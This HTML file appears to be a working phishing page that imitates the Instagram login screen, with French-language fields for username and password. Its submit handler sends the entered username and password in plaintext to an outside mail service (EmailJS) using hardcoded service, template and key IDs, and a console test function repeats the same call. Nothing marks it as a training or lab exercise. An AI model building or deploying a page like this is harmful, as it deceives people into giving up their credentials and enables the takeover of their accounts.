<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        emailjs.init("0s69puSeiECXHqvEG"); // Initialisation avec ta clé publique
    </script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            width: 350px;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .logo img {
            width: 150px;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group input {
            width: calc(100% - 20px);
            padding: 10px;
            font-size: 14px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background-color: #fafafa;
        }
        .form-group button {
            width: calc(100% - 20px);
            padding: 10px;
            font-size: 14px;
            color: #fff;
            background-color: #3897f0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .form-group button:hover {
            background-color: #287dc0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo.png" alt="Logo">
        </div>
        <form id="form">
            <div class="form-group">
                <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail">
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Mot de passe">
            </div>
            <div class="form-group">
                <button type="submit">Connexion</button>
            </div>
        </form>
    </div>

    <script>
        document.getElementById('form').addEventListener('submit', async (e) => {
            e.preventDefault(); // Empêche le rechargement de la page

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (!username || !password) {
                alert("Veuillez remplir tous les champs.");
                return;
            }

            try {
                console.log("Tentative d'envoi des données...");

                // Appel à l'API EmailJS avec fetch
                const response = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        service_id: "service_pr4cilr", // Remplace par ton Service ID
                        template_id: "template_p533svs", // Remplace par ton Template ID
                        user_id: "0s69puSeiECXHqvEG", // Clé publique
                        template_params: {
                            username: username,
                            password: password,
                        }
                    }),
                });

                if (response.ok) {
                    console.log("Réponse EmailJS :", await response.json());
                    alert("Les informations ont été envoyées avec succès !");
                } else {
                    console.error("Erreur :", response.statusText);
                    alert("Une erreur s'est produite lors de l'envoi des données.");
                }
            } catch (error) {
                console.error("Erreur lors de l'envoi :", error);
                alert("Une erreur s'est produite lors de l'envoi des données.");
            }
        });

        // Fonction pour tester EmailJS directement dans la console
        async function testEmailJS() {
            try {
                const response = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        service_id: "service_pr4cilr",
                        template_id: "template_p533svs",
                        user_id: "0s69puSeiECXHqvEG",
                        template_params: {
                            username: "TestUser",
                            password: "TestPassword",
                        },
                    }),
                });

                if (response.ok) {
                    console.log("Test EmailJS réussi :", await response.json());
                } else {
                    console.error("Erreur lors du test :", response.statusText);
                }
            } catch (error) {
                console.error("Erreur de test EmailJS :", error);
            }
        }

        // Exécute `testEmailJS()` dans la console pour vérifier si EmailJS fonctionne
        console.log("Utilisez testEmailJS() dans la console pour tester EmailJS.");
    </script>
</body>
</html>
